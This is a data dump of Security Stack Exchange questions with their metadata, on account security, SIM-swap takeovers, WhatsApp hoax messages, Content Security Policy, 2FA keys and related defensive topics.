"213089","1","","","2019-07-07 06:48:44","","3","178","<p>I recently came across articles where an attacker contacted a telecom company and got them to change the sim card registered with the target's phone number. After doing so, he was able to reset the passwords in almost all the accounts (like gmail, outlook) etc and hijack everything.</p>

<p>This also defeats 2FA (at least in Google) as anybody who controls my phone number can reset the password of gmail. Once an attacker has access to Google account, they can go on to gain access to almost every other website where my gmail account is the verification mail. This includes AWS or Google cloud where I could then be charged significant amounts of money.</p>

<p>So my first question is how do I prevent this from happening? Is there any way to tell Google to stop using my phone number as fallback for verification or tell them to use something else along with phone number.</p>

<p>2nd question. If this happens, how can I recover my accounts (Google and all the connected accounts) as soon as possible? This will be difficult because the attacker will probably change all my passwords. He/she might also go one step ahead to change the verification emails/phone number, effectively locking me out of my account. Also if I somehow, do manage to gain back the access to gmail, the attacker could meanwhile hijack all my other accounts tied up with gmail and change email id in them preventing me from resetting password there.</p>
","196081","","103542","","2019-07-07 21:58:41","2019-07-07 21:58:41","Add another layer of security in accounts except phone number","<account-security><protection>","0","6","","","","CC BY-SA 4.0"
"213090","1","","","2019-07-07 07:47:45","","-5","314","<p><strong>NOTE: I am New contributor, if the question needs some improvement please tell in comment before down voting!</strong></p>
<p>Usually I see messages on whatsapp and sometime on some other forums stating that forward this message to Ten or Twenty people and don't ignore. Apparently, there is nothing visible that could benefit that message writer. But still people write and innocent people do forward it. Yes, sometimes they include links saying click and get recharge which is obviously risky but I am more interested in the one that don't contain any link or are even voice notes.</p>
<p>Example:</p>
<blockquote>
<p>✅     FINAL NOTICE     &quot;Dont ignore please read it carefully&quot; Hello,
I. Am JUAN CARLOS director of whatsapp, this message is to inform
all of our users that we have sold whatsapp to Mark Zuckerberg for 19
billion $. WhatsApp is now controlled by mark zuckerberg. If you have
at least 20 contacts send this sms and logo of your whatsapp will
change to a new icon with facebook's &quot;f&quot; within 24 hours.Forward this
message to more than 10 people to activate your new whatsapp with
facebook services or else your account will be deleted from new
servers. This is the final notice! Hello everyone, it seems that all
the warnings were real, the use of WhatsApp cost money from summer
2017. If you send this string to 20 different on your list, your icon will be blue and will be free for you. If you do not believe me see
tomorrow at 6 pm ending WhatsApp and have to pay to open it, this is
by law This message is to inform all of our users, our servers have
recently been very congested, so we are asking you to help us solve
this problem. We require our active users to forward this message to
each of the people in your contact list to confirm our active users
using WhatsApp, if you do not send this message to all your contacts
WhatsApp will then start to charge you. Your account will remain
inactive with the consequence of losing all your contacts. Message
from Jim Balsamic (CEO of Whatsapp ) we have had an over usage of user
names on whatsapp Messenger. We are requesting all users to forward
this message to their entire contact list. If you do not forward this
message, we will take it as your account is invalid and it will be
deleted within the next 48 hours. Please DO NOT ignore this message or
whatsapp will no longer recognise your activation. If you wish to
re-activate your account after it has been deleted, a charge of 25.00
will be added to your monthly bill. We are also aware of the issue
involving the pictures updates not showing. We are working diligently
at fixing this problem and it will be up and running as soon as
possible. Thank you for your cooperation from the Whatsapp team”
WhatsApp is going to cost us money soon. The only way that it will
stay free is if you are a frequent user i.e. you have at least 10
people you are chatting with. To become a frequent user send this
message to 10 people who receive it (2 ticks) and your WhatsApp logo
should turn blue.</p>
<p>Forward this message to all WhatsApp contact.</p>
</blockquote>
<p>Some other samples are <a href=""https://www.geekysplash.com/25-hilarious-whatsapp-hoax-texts-and-forwarded-messages/"" rel=""nofollow noreferrer"">here</a>.</p>
<p><strong>Edit:</strong></p>
<p><em>The question is about &quot;real&quot; software virus. Is there some way to attach malicious content alongside a forward message to steal information or harm other devices. Because as in example, sometime it does not contain even a link to click but only alphabets.</em></p>
","211771","","-1","","2020-06-16 09:49:05","2019-07-08 08:55:12","Is there some hidden worm attached with whatsapp messages that state forward this messgae to 20 people?","<account-security><whatsapp><threats><worm>","1","9","","2019-07-09 17:55:07","","CC BY-SA 4.0"
"145130","1","","","2016-12-12 17:24:55","","2","968","<p>I have a doubt regarding the use of the Content Security Policy (CSP) as protection mechanism against clickjacking.</p>

<p>I have created an online Proof of Concept (PoC) on a web page where I put a button that loads the URL that is specified in an input field which is up and running on a server. This PoC is to test if a site is vulnerable or not, and based on that, I have tested a site which is using CSP to prevent clickjacking attacks. The result on my online PoC tell me that the site is not vulnerable because I'm not able to framing it, however, if I repeat the test using the static template provided in the OWASP site, then I'm able to see the content of the web page within the  element.</p>

<p>So, I feel that the site may still be vulnerable, and I would like to know your opinion.</p>

<p>I noticed that the CSP is not returned in the header when I use the static PoC, do you believe that the this an error in programming which makes vulnerable the site?</p>

<p>Has anyone experienced this before?</p>
","132521","","98538","","2018-03-13 21:13:36","2018-03-13 21:13:36","Content Security Policy against clickjacking fails with static PoC","<content-security-policy><clickjacking>","3","4","","","","CC BY-SA 3.0"
"213246","1","","","2019-07-10 02:01:34","","1","763","<p>I want to order a 2FA key (like yubikey) online and I want to know if someone could make a duplicate of whatever key I order during shipping.
I don't want to discuss if someone could access my package. I want to know if someone is able to access my package during shipping or even after I get it, could they make a duplicate of my key?</p>

<p>And if they can, and they also have my password, that means they can also access my account (Gmail) after I setup the 2FA authentication right? What about locking me out of my account? </p>

<p>And can you tell me what key would be compatible with multiple online accounts and preferably offline use on Linux (Ubuntu) as well? </p>
","209619","","","","","2019-07-10 03:47:46","Can 2FA keys be duplicated?","<authentication><multi-factor><account-security><yubikey><u2f>","1","0","","","","CC BY-SA 4.0"
"213302","1","213307","","2019-07-10 22:44:10","","0","181","<p>I'm new here, and sorry if my english is a little bit broken it's not my main language.</p>

<p><strong>I'm trying to put together a document/ppt for my startup with a Zero Day policy structure.</strong></p>

<p>But I'm not finding real implemented flows, information, or something I can base this from (anything is helpfull)</p>

<p>What I found on my research mainly focus on specific discussing how heartbleed or the cve work.</p>

<p>I want to put something very straightforward but would love different point of views or examples if there are like:</p>

<ul>
<li>We will be suscribed to receive every update automatically from the different applications, OS that we own</li>
<li>Critical updates will be reviewed, researched and implemented at top on 48 hours on all the servers</li>
<li>Medium/Urgent updates will be reviewed, researched and implemented at top on 1 week on all servers</li>
<li>Low Updates will be reviewed and implemented at most on the same month</li>
<li>A Team will monitor the audits logs of ports that are reporting status that are receiving suspected activity once a week on a internal meeting and define if new meassures have to be implemented</li>
<li>ETC</li>
</ul>
","212039","","","","","2019-07-11 06:45:07","Zero Day Policies implementation","<attack-prevention><content-security-policy><zero-day><prevention>","1","1","","","","CC BY-SA 4.0"
"145385","1","","","2016-12-15 11:13:14","","22","9244","<p>I'm trying to develop a CSP for the site <a href=""https://www.lidl-tour.ro"" rel=""noreferrer"">https://www.lidl-tour.ro</a>.</p>

<p>Right now there is a policy than runs in report-only-mode, so nothing is blocked at the moment.</p>

<p>The site contacts googleads.g.doubleclick.net and stats.g.doubleclick.net. So I have put these hosts on the whitelist.</p>

<p>But it seems that these sites then (make the user) load content from www.google.com <strong>and</strong> www.google.YOURTLD. I can see CSP violations being reported where the browser wanted to contact <a href=""https://www.google.com.cy"" rel=""noreferrer"">https://www.google.com.cy</a>, <a href=""https://www.google.co.uk"" rel=""noreferrer"">https://www.google.co.uk</a>, <a href=""https://www.google.it"" rel=""noreferrer"">https://www.google.it</a>, <a href=""https://www.google.de"" rel=""noreferrer"">https://www.google.de</a> and so on.</p>

<p>Now I don't want to put all google domains into the CSP.</p>

<p>I thought about allowing <a href=""https://www.google"" rel=""noreferrer"">https://www.google</a>.* (I don't know if this is even valid in a CSP) but this expression wouldn't match URLs like <a href=""https://www.google.co.uk"" rel=""noreferrer"">https://www.google.co.uk</a>.</p>

<p>So, how can I build a valid CSP in this case?</p>
","70038","","","","","2022-09-07 05:21:50","CSP allowing all Google domains?","<google><content-security-policy><third-party>","5","4","","","","CC BY-SA 3.0"
"145430","1","","","2016-12-15 20:07:41","","1","81","<p>I wonder if it would be a good idea if a shopping system would reuse existing user accounts across multiple orders. For example:</p>

<ul>
<li>A person buys a concert ticket in an online shop. The ticket is mailed to them.</li>
<li><p>The person does not create a user account. Instead, an anonymous user entity is created and associated with the order.</p></li>
<li><p>A few weeks later, the person buys another ticket using the same e-mail address.</p></li>
<li>The system recognises the person by the e-mail adress and links the new order with the existing entity.</li>
<li>If the person has entered a different name etc. the system would also update this information in the existing entity.</li>
</ul>

<p>Now you might ask: Why would I want to re-use the existing account instead of creating a new one? Because users can decide to “activate” their previously “anonymous” account (by requesting an e-mail with an activation link). It would be nice if they could then see the orders they made before the activation.</p>

<p>Yes, we could auto-activate the account after the first order and send the user their credentials. But they’d delete/forget/ignore the e-mail and would have to go through account recovery during the next checkout process, which would obviously be a horrible conversion breaker.</p>

<p>Therefore I wonder, is reusing the account a good idea from a security standpoint? If not, how could it be implemented otherwise if I want to make history available without hurting the UX too much?</p>
","133549","","133549","","2016-12-15 20:53:08","2016-12-15 21:06:57","Reusing an “anonymous” user entity across orders","<account-security><e-commerce>","1","0","","","","CC BY-SA 3.0"
"213569","1","213574","","2019-07-16 14:22:13","","2","415","<p>I have recently changed banks and my new bank has a benefit scheme (discounts etc.) that has its own website and different login details to my online banking (I think the benefits system is administered by a third-party).</p>

<p>They are clearly storing passwords in plain text <em>and</em> there's no ability to change my password to anything of my own choosing. This is the main crux of a complaint I will be making to the ICO on GDPR grounds. </p>

<p>However, the username is also preset and unchangeable. To make matters worse, IMO, is that the username is my bank sort code + account number. I am trying to decide if this is also a security issue.</p>

<ol>
<li><p>Whilst my bank account number is not necessarily secret (it is printed on cheques, and I need to give it to people to transfer money to me), it seems needlesly open.</p></li>
<li><p>While most other websites also don't allow you to change your username and pre-set your username to your email address, in that scenario I at least have the option to create a throwaway email address, or use a + address.</p></li>
<li><p>It limits usernames to a single character set (numeric) which makes it easier for brute force hackers etc.</p></li>
<li><p>Someone hacking my account will be able to gain the following information about me: </p>

<ul>
<li>Name</li>
<li>Address</li>
<li>Sort code</li>
<li>Account number</li>
<li>Email address</li>
<li>Phone number</li>
</ul></li>
</ol>

<p>All that's missing to make the complete set of personal information would be my date of birth, and for all I know they're storing that information about me behind the scenes too.</p>

<p>Should I use the username argument to strengthen my complaint about the password storage?</p>
","161472","","","","","2019-07-16 17:12:56","Is it insecure to not let a user choose their own username, and base the username on a known pattern?","<account-security><user-names>","1","8","","","","CC BY-SA 4.0"
"213658","1","213669","","2019-07-17 20:57:41","","1","345","<p>I am trying to figure out the best way to do this. I have done some searching and all I have found is about storing API keys in a back end, nothing like my use-case where there is no back end.</p>

<p><strong>Background:</strong></p>

<p>I am writing a web app which only runs client side, no back end. In essence the app is a visualizer for the responses from a 3rd party API. Each user would provide their own API key and the app would make the API calls on their behalf, then visualize the responses client side.</p>

<p>There is no logging in by the user into anything. The site is an SPA in React which runs totally client side. The only calls the app makes to the wider net is to this 3rd party API (not counting calls to CDNs for resources when the app is first loaded).</p>

<p><strong>Question:</strong></p>

<p>How do I store the API key for the user? I also asked this on r/webdev and the answer I got was in plain text in localStorage which does not feel like a good idea.</p>

<p>Since the keys are not leaving the client except when making API calls which are HTTPS I would assume the only way to get the keys would be via an XSS attack?</p>
","212497","","","","","2019-07-18 00:05:11","Having web client do requests with User's 3rd party API key?","<web-browser><xss><password-management><account-security>","1","0","","","","CC BY-SA 4.0"
"213715","1","213718","","2019-07-18 16:08:29","","30","5823","<p>Suppose we send out email verification to new subscribers that where they have to click on a link to verify their account.</p>

<p>Suppose they forget to verify it, and later try to login.</p>

<p>Should the error message say ""Your user name or password is incorrect?"", instead of letting them know that they have forgotten to verify the account.</p>

<p>I assume this is the most secure way of handling it, because if we tell them that they have to verify the account, we are letting them know that an account with that userid exists ...</p>

<p>Thoughts?</p>

<p>Perhaps the best way to handle it is to allow them to access the account, but don't let them do anything in it until they are verified?</p>
","160653","","","","","2019-07-19 16:25:26","The most secure way to handle someone forgetting to verify their account?","<authentication><password-cracking><account-security><oauth><credentials>","6","11","","","","CC BY-SA 4.0"
"78630","1","78631","","2015-01-07 19:00:00","","3","1547","<p>Suppose your Aunt or Uncle is easily fooled by phishing attempts and their computer has multiple root kits and key loggers running.  Assume their computing habits will never change.  </p>

<p>Looking at his wireless router you can see that he only visits a few dozen or a few hundred websites multiple times in a month.  Instead of trying to keep the bad guys out, set up the firewall's default outbound rule to be block (deny/reject) everything to prevent the bad guys from getting out.</p>

<p>If this non-technical relative had a simple python program running with an ssh connection into the firewall, the program could monitor the IP addresses as they get blocked.  The program would then ask the user if they want to access 72.21.211.176 Amazon.com (USA).  If the user says yes, the program might then ask:  Allow outbound access to all 72.21.<em>.</em> networks?  This is an attempt to save some time creating a whitelist.</p>

<p>I know opinions vary as to the value of egress filtering.  But with all the technology advances in the last 20 years, I find it frustrating that there is not a simple way for non-technical users to prevent sending data to that village in Wales (Llanfairpwllgwyngyll) that we all know is full of nation state hackers.<br>
<a href=""http://en.wikipedia.org/wiki/Llanfairpwllgwyngyll"" rel=""nofollow"">http://en.wikipedia.org/wiki/Llanfairpwllgwyngyll</a></p>

<p>Since I am more of a SQL developer than a security expert, I am posting this to see if this would realistically help secure the home network in the example above.  Of course the solution is not perfect, but it seems like it would help.  This thought came about after reading about DGA malware that have been known to create thousands of new domains per second and realizing that attackers are way more sophisticated than I imagined.  <a href=""http://en.wikipedia.org/wiki/Domain_generation_algorithm"" rel=""nofollow"">http://en.wikipedia.org/wiki/Domain_generation_algorithm</a></p>

<p><strong>UPDATE</strong>
As both answers indicate, this is not a good way to approach the problem.  Too many IPs in the world and the user can't be trusted to allow only safe domains.</p>
","64795","","64795","","2015-01-08 17:22:49","2015-01-08 17:22:49","Firewall egress filtering / quick whitelisting","<linux><firewalls><iptables><security-theater><freebsd>","2","2","","","","CC BY-SA 3.0"
"78736","1","","","2015-01-08 21:29:26","","1","298","<p><strong>Scenario:</strong> You are on Craigslist searching for cheap electronics and come across an add for cheap E-reader. It's a bit of a deal with about 20-40% off the retail price so you contact the seller and all seems normal. You meet up to buy it and while you are discussing the E-reader you want to catch the seller off guard (in an effort to elicit an honest answer/reaction) and ask them a pointed security question (or two) that will gauge whether that person even knows enough to do anything technologically malicious.</p>

<p><strong>What question(s) do you ask?</strong></p>

<p>Let's assume you both are just an average Jack and Diane not cold war spies...</p>

<p><strong>I submit imagine something like this:</strong></p>

<blockquote>
  <p><code>While Jack and Diane are closing the deal Suckin' on chili dogs
  outside the tastee freeze, Diane says...</code></p>
  
  <p>Diane - <em>""Hey Jackie, do you know what the hex file signature books on
  this E-reader?""</em> </p>
  
  <p><code>Jackie sits back, Reflects his thoughts for the moment, Scratches his
  head...</code></p>
  
  <p>Jack - <em>""What's a hex file signature?""</em></p>
  
  <p>Diane - <em>""Nevermind baby, You ain't missin' nuth-in.""</em></p>
  
  <p>Jack - <em>""Oh yeah, life goes on...""</em></p>
  
  <p><code>Two American kids done the best they can and close the deal.</code></p>
</blockquote>

<p>In the above scenario, Diane feels relatively confident that Jack doesnt really know enough to root a device and put malware on it so she can feel safe buying from this football star.</p>

<hr>

<p>I realise the premise is not the most secure because anyone can lie and depending on how well you can read a poker face you may not be able to discern the truth, but I am just looking for a quasi-security theatre solution. I mean once again, we are assuming you are buying an E-reader to just read 50 shades of grey and not the latest <a href=""http://en.wikipedia.org/wiki/President%27s_Daily_Brief"" rel=""nofollow"">Presidential Intelligence Briefing</a></p>

<p><em>Also note that this is not limited to Ebooks, Americans, football stars, or 80's music lovers.</em></p>
","43611","","37496","","2015-01-08 21:43:34","2015-01-08 23:21:52","What question(s) can someone ask an individual to quickly determine their 'hacking ability'?","<audit><security-theater><investigation>","1","2","","","","CC BY-SA 3.0"
"146036","1","146063","","2016-12-21 19:58:42","","0","158","<p>I'm working with an android app sending data to a service hosted on AWS. The provider specifies that AWS in itself isn't HIPAA compliant.</p>

<p>In which way should this by a source of worry? Regardless of the nature of the data, what specific elements makes this a problem? It seems to me that it not so specific from a cyber security perspective?</p>

<p>EDIT: This is not for a health care application. However the service provider mention it is not compliant on its website - therefore I want to know what practically this compromises (or not) from a security perspective. I know that some clients in some applications (or governement agencies) will not use services not compliant with certain standards (such as HIPAA). However, to me it doesn't mean that being non-HIPAA is unsafe - for all I know it could easily be mostly about PR and not so much about security of the service/data on the server.</p>
","134122","","134122","","2016-12-21 20:47:28","2016-12-22 00:27:36","HIPAA compliance: how much does it matter?","<account-security><hipaa>","1","4","","2016-12-22 14:31:46","","CC BY-SA 3.0"
"146154","1","146200","","2016-12-22 22:03:23","","4","1217","<p>I am implementing a solution with set of Micro Services (Spring Rest Services)  with Rabbit MQ as the message broker. The Edge server is Authenticated using  OAuth based  Identity server.  Internal Micro Sevices calls are not Authorized or Authenticated.   </p>

<p>My objective is to secure all internal Micro Services with Authentication and Authorization. Need to secure internal communication from MiTM attack or eavesdropping.</p>

<p>One thing we can do is relaying the edge server's Auth Token into internal Micro Services. But if someone captures the Auth token, they can perform a Confuse Deputy attack ( act as a legitimate Micro Service ).  And anyone can intercept or eavesdrop the communication in between Micro Services.</p>

<p>Please let me if you know a better solution for this.</p>

<p>Thanks in advance. </p>
","134150","","","","","2016-12-23 11:57:44","Securing Micro Services Architecture internally","<java><content-security-policy><spring-framework>","2","0","","","","CC BY-SA 3.0"
"214311","1","","","2019-07-29 21:45:31","","0","48","<p>For example, if I am using my personal laptop on a public wifi, and type in the website I want to go to that includes HTTPS, (lets assume <a href=""https://www.google.com/gmail/"" rel=""nofollow noreferrer"">https://www.google.com/gmail/</a>) can I reasonably trust that I'm establishing a secure encrypted connection with that website? Can a man in the middle compromise that kind of connection?  I encounter this type of scenario all the time at hotels that have open wifis without passwords, and I'm always nervous. </p>
","196995","","196995","","2019-07-30 18:15:02","2019-07-30 18:15:02","Is a trusted device, on a public network, still vulnerable to a man in the middle attack?","<encryption><man-in-the-middle><account-security>","0","15","","2019-07-29 22:54:17","","CC BY-SA 4.0"
"214337","1","214340","","2019-07-30 07:11:11","","1","797","<p>I have a website to do security testing. The CSP is as follows.</p>

<pre><code>default-src * ;
style-src 'self' 'unsafe-inline' data: https://netdna.bootstrapcdn.com/ http://s3.amazonaws.com/ https://s3.amazonaws.com/ ;
script-src 'self' 'unsafe-inline' 'unsafe-eval' data: https://cdn.ckeditor.com/ http://s3.amazonaws.com/ https://s3.amazonaws.com/ ;
font-src 'self' data: https://netdna.bootstrapcdn.com/ http://s3.amazonaws.com/ https://s3.amazonaws.com/
</code></pre>

<p>As per my understanding, <code>default-src * ;</code> loads 
everything such as script, html and so from any domain. Is it safe to do? The web app loads third party scripts, images and css from only the three domains as mentioned in the policy. In that case <code>default-src 'self'</code> would suffice? </p>

<p>Also, what threat usage of <code>data:</code> could create? Does it break the application if I remove that? </p>
","60068","","98538","","2019-07-30 08:05:51","2019-07-30 08:05:51","Is using default-src * safe?","<xss><content-security-policy><header>","1","0","","","","CC BY-SA 4.0"
"214433","1","","","2019-07-31 20:07:53","","0","1759","<p>My newest boyfriend sent me a <a href=""https://grabify.link/"" rel=""nofollow noreferrer"">Grabify</a> link on Messenger. Without thinking (probably because of trusting him), I clicked the link (yeah, I'm an idiot, lol). The link has routed to my Facebook account.</p>

<p>I'v done some searches online but I find no answer. I just wanted to know if there's any possibility that he was able to get my Facebook/Messenger login information or if my account is hacked?</p>
","213471","","98538","","2019-07-31 20:15:01","2019-08-01 19:25:35","Could clicking a Grabify link to my Facebook page get me hacked?","<malware><account-security><facebook>","2","1","","","","CC BY-SA 4.0"
"214461","1","214462","","2019-08-01 07:48:22","","1","151","<p>Is there a way to exchange phone numbers/email addresses through public chats with a person without giving them or other communication information away to all the other people in the public chat?</p>

<p>Example for a public chat can be the comments to this post right here. </p>
","213504","","","","","2019-08-01 07:58:02","Exchange sensitive information through public chat","<cryptography><email><anonymity><account-security><phone>","1","1","","","","CC BY-SA 4.0"
"214488","1","","","2019-08-01 14:30:19","","2","480","<p>I was thinking about end-to-end encryption for my chat application, but I am struggling to understand how do I migrate my private keys from one device to another.</p>

<p>One option I thought is to store private keys somewhere very secure (which I can't imagine of), but it will expose the privacy...</p>

<p>Another option is to do something with the password to encrypt messages...</p>

<p>Is there anyone who can help with or make any suggestions how to implement end-to-end encryption with a possibility for users to start using same app on another device or similar?</p>
","213535","","","","","2019-08-01 14:38:37","How do I migrate my private key from one device to another in instant messaging app?","<account-security><end-to-end-encryption>","1","0","","","","CC BY-SA 4.0"
"214623","1","","","2019-08-03 21:59:02","","1","335","<p>I'm currently building a web based membership application form that will require a user to enter an SSN and other identifiable information. Part of the requirements of the membership application is to allow a user to be able to resume their application and pre-fill of the information they already entered into the form fields. The stakeholders do not want to burden the user with a username and password. We have come up with the following alternative authentication method. </p>

<p>A user can start an application and click a button to ""Save"" their application. When they click ""Save"" an email is sent to them and they receive a 6 character alpha numeric reference code. </p>

<p>To ""resume"" the application the user must then enter the 6 character reference code as well as their birth date, last name, and last four digits of their SSN. </p>

<p>My question is, on a scale of 1 to 10 what would the risk factor in allowing a user to authenticate in this manner. What is the probability that someone could load someone else's application if they brute force attacked the web based form. And if the risk scale is high, then what can I do to increase the security on this form. I can't implement a password system and the reference code needs to be simple enough that someone could over the phone present the code to a customer service agent. </p>

<p>Additional Security: </p>

<ul>
<li>Reference Codes will expire after 1 week on non-use.      </li>
<li>Reference Codes will expire once the form has been submitted.</li>
<li>The web application is using HTTPS and TLS to transfer the data.</li>
</ul>

<p>About 200 applications will be submitted per week, so around a max of around 200 applications might have active reference codes in a given week. </p>
","167403","","167403","","2019-08-04 02:32:37","2019-08-06 11:26:23","Potential Risks Using Reference Code Based Authentication For Web Based Application Form That Contains SSN","<authentication><account-security><.net><identity><identity-theft>","5","6","0","","","CC BY-SA 4.0"
"214675","1","","","2019-08-05 09:58:03","","1","146","<p>I have some users that prefer to create a new user account instead of resetting the password (or investigating why there is an issue with the account). Then delete the old account.</p>

<p>I've personally found that this is generally bad practice for an admin and a suspicious pattern from a security point of view (user SID change, so we may lose user traceability).</p>

<p><strong>Do you think this is a real security concern?</strong></p>
","","user213795","6253","","2019-08-06 06:58:04","2019-09-05 08:00:55","AD user recreation, security issue","<account-security><active-directory>","1","2","","","","CC BY-SA 4.0"
"214727","1","","","2019-08-06 04:13:43","","0","229","<p>We have a platform where users can sign up for free using their email addresses (they can also associate social media account). Other than the name, email and social account there no other personal information is held about the customer. There is a possibility that the user account may be compromised through brute force attack by bots. Please keep in mind that we also do not want to discourage legitimate user experience. </p>

<p><strong>Scope</strong><br>
What are the best practices or case studies around the platform on</p>

<ol>
<li>How many attempts before locking out an account, and</li>
<li>duration of account lockout (linear or exponential based on the number of further retries). </li>
</ol>

<p><strong>Out of scope</strong>: Strong password</p>
","213859","","6253","","2019-08-06 07:08:49","2019-08-06 11:08:18","What are the security practice or case studies for account lockouts?","<account-security><account-lockout>","2","3","","","","CC BY-SA 4.0"
"214814","1","214815","","2019-08-06 21:26:02","","559","100434","<p>I've been playing around with different login forms online lately to see how they work. One of them was the Facebook login form. When I logged out of my account my email and password were autocompleted by my browser. Then I decided to misspell my email and see what would happen if I tried to log in.</p>

<p>To my surprise I logged in with no problem after changing my email from <code>example@gmail.com</code> to <code>example@gmail.comm</code>. I then started experimenting with different spelling errors and I had no problem logging in as long as it was not too far off my real email. I tried changing the domain name as well <code>example@gmadil.coom</code>, my email prefix <code>ezfxample@gmail.com</code> etc. </p>

<p>Then I also tried misspelling my password and as long as it was not too far off my real password I could log in no problem (with the password it worked when adding one random letter before or after the real password, but not when adding a letter in the middle of it).</p>

<p>I also checked the actual data sent in the request by looking at it in Chrome DevTools and in fact it was the wrong data sent.</p>

<p>How can this be? Should I be worried about my account's security?</p>
","175806","","6253","","2019-10-16 15:52:23","2019-10-16 15:52:23","Why can I log in to my Facebook account with a misspelled email/password?","<authentication><account-security><facebook>","3","22","","","","CC BY-SA 4.0"
"214843","1","","","2019-08-07 08:44:54","","1","180","<p>I had checked youtube.com and stackoverflow.com. And found both of them can not log out if the network is unreachable.  </p>

<p><strong>I think this is a security risk, right?</strong></p>

<p>Please image a situation below:</p>

<p>I visited this website on my friend's computer. And before I leave, I clicked the logout button but the network is down in that time. So I go home and thinking that I had logged out to succeed. But on another day, my friend opens his computer to start to visit stackoverflow and found my account still there.  </p>
","213979","","","","","2019-08-07 12:04:20","Can not logout when the network is unreachable","<web-application><account-security>","1","5","","2019-08-12 14:02:50","","CC BY-SA 4.0"
"214859","1","214863","","2019-08-07 12:55:48","","0","127","<p>Scenario: User searches for something and gets a link to a sub-page on a site, proceeds to go there, but is asked to sign-up/login - they do so, only then once they are logged in, they are redirected to the main page or the ""mobile"" version of the page, as opposed to the one that they were originally intending to view</p>

<p>Is there any sort of security reason for this, or is it just lazy programming, or something else? </p>
","52102","","","","","2019-08-07 14:01:48","Is there any security reason for re-directing to the main/mobile page after login?","<authentication><web-application><account-security><url-redirection>","2","0","","","","CC BY-SA 4.0"
"214879","1","","","2019-08-07 17:31:35","","3","181","<p>I am looking for recommendations on how to implement our CSP policy. We have an Angular SPA application, that has an iframe without any src attribute. We populate the content of the iframe dynamically based on markup that we receive from an API. The markup that is returned from the API could have scripts that are not controlled by us. The SPA application will render the markup, including executing the scripts that get returned from the API as part of the markup. The issue here is that a potentially malicious script could get returned from the API, which could hijack user information from the parent SPA application.</p>

<p>In this situation, how do we go about implementing CSP policy for the SPA application? I understand that there might not be a way to restrict hijack without doing some major architecture changes in the way that the content is rendered by the SPA. Any suggestions are welcome.</p>
","214045","","","","","2019-08-07 17:31:35","CSP for iFrame without any src attribute","<javascript><content-security-policy><single-page-app>","0","0","","","","CC BY-SA 4.0"
"146960","1","","","2017-01-02 02:40:50","","0","1895","<p>Running a shared hosting service, a client contacted me if I could disable <code>mod_security</code> for their webapp. The thing is, there is this patchwork webshop CMS called Prestashop with some hair-raising solutions (I'm not here to complain about that), and for it to function properly one of its technical requirements is that you must not use <code>mod_security</code> at all.</p>

<p>I was instantly thinking, if I really had to do this, I'd need to change everything, like put all websites into isolated docker containers running different webservers and put an nginx reverse proxy in front of all this, this would be a huge job. Is there any other solution to achieve that malicious requests get filtered on this specific installation without having to make in-depth changes to the server and expose prestashop as a single point of failure?</p>
","52758","","","","","2018-08-15 18:10:05","Prestashop + mod_security concerns","<mod-security><cms>","2","0","","","","CC BY-SA 3.0"
"215092","1","215093","","2019-08-10 19:31:45","","2","582","<p>In case of an open API, the only possible value for Access-Control-Allow-Origin is a wildcard (*), since you can't have a list of allowed domains.</p>

<p>Still, this seems not to bug developpers and appears to keep the system secure. How is that possible? Isn't allowing all domains to make every request the same as not having SOP or CORS Policy?</p>

<p>It might be that I don't really get the security provided by CORS, but as I understood it, it avoid an unwanted domain to use session cookies of a user without his consent. Still, I don't get why it protect the user to see his account used for unwanted purposes once a data modifying route is opened to this domain.</p>
","207657","","","","","2019-08-11 03:20:48","Why CORS is still securing an open api where all requests have a wildcard (*)?","<account-security><cors>","1","0","","","","CC BY-SA 4.0"
"215393","1","","","2019-08-16 08:33:53","","0","516","<p>I was recently sent a notification by <a href=""https://haveibeenpwned.com/"" rel=""nofollow noreferrer"">https://haveibeenpwned.com/</a> that one of my email addresses has been found in a breach, in particular in a breach of <a href=""https://www.chegg.com"" rel=""nofollow noreferrer"">https://www.chegg.com</a>. I am positive I never signed up for an account there, it's a US education company and I am not from there, nor did I ever have anything to do with US education.</p>

<p>I have verified the email is actually from haveibeenpwned.</p>

<p>I figured it's possible they merged with another company and took over their user base, but I can find no evidence of that.</p>

<p>If I try to sign in to chegg.com I do get a notification that I should reset my password for logging in. I did this and got a reset password email, what makes it even more dodgy is that I am adressed as <code>Hi , to reset your password...</code>  so obviously they left out the name I should be addressed by after <code>Hi</code>.</p>

<p>I actually logged in with the new random password and it seems my account did have a free ebook purchase there, but it's definitely not a book that I ever was interested in. I suppose the likely scenario is that chegg never did email validation and someone just used my email address? Are there any other options?
I also don't remember getting any signup emails which is common for services even if they don't verify email addresses.</p>
","19973","","","","","2019-08-16 08:58:38","Why would I 'have been pwned' on a website that I never had an account on?","<account-security><have-i-been-pwned><breach>","1","0","","2019-08-17 21:46:34","","CC BY-SA 4.0"
"215405","1","","","2019-08-16 11:10:32","","1","132","<p>Recently, read an article about phone number being used to hack into one's account.
<a href=""https://nyti.ms/2P8kKZ4"" rel=""nofollow noreferrer"">NYTIMES-Phone hacking</a></p>

<p>What needs to be done to prevent my phone number being searched? (Return invalid hyperlinks instead of providing all info).</p>
","214731","","","","","2019-08-16 11:10:32","How to prevent phone number being searched online?","<account-security><phone>","0","6","","2019-08-16 11:29:50","","CC BY-SA 4.0"
"147400","1","","","2017-01-05 19:08:05","","0","178","<p>I am in the planning stages of my application.  The app works like this</p>

<ol>
<li>User buys app.</li>
<li>We create the user and account and add 100 credits.</li>
<li>User send a request to use one of the services provided by the app.</li>
<li>Webservice checks if user has enough credits and sends a ""yes"" or ""no"" response to the user</li>
</ol>

<p>Security involving the credits is simple enough, since we check the credits on the server side, and the request will be sent with the users unique id.My concern is the response being spoofed. Im fairly new to webservices, so I could be way off. But wouldn't it be possible for an end-user to mimick our webservice on their localhost and provide  the ""yes"" response to the application?</p>
","135401","","","","","2017-01-06 03:21:21","Securing Webservice from response spoofing?","<web-service><account-security>","2","1","","","","CC BY-SA 3.0"
"80267","1","80396","","2015-01-28 10:50:04","","13","927","<p>From theoretical point of view, <a href=""https://grsecurity.net/"">grsecurity</a> kernel patch looks like a great hardening tool. Most importantly, <a href=""https://pax.grsecurity.net/"">PaX</a> seems like a good idea.</p>

<p>Do these theoretical advantages have indeed practical effect in preventing malware attack/exploits/rootkits ?</p>

<p>There were several critical security problems recently (Shellshock, Heartbleed, Turla, ... to name just a few)</p>

<p>Can somebody please point to a concrete exploit which <code>grsecurity</code> would have prevented ?</p>
","28654","","28654","","2015-02-05 18:32:58","2015-02-05 18:32:58","concrete real-life examples where grsecurity prevented an exploit","<malware><exploit><rootkits><kernel><grsecurity>","2","1","","","","CC BY-SA 3.0"
